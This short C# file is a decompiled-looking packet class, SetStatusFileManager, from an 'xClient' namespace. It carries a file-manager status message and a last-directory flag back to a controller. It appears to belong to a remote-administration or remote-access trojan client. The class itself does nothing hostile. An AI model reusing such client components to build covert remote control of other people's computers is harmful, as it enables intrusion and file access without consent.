using System;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class SetStatusFileManager : GInterface4
{
	public string Message { get; set; }

	public bool SetLastDirectorySeen { get; set; }

	public SetStatusFileManager()
	{
	}

	public SetStatusFileManager(string message, bool setLastDirectorySeen)
	{
		Message = message;
		SetLastDirectorySeen = setLastDirectorySeen;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
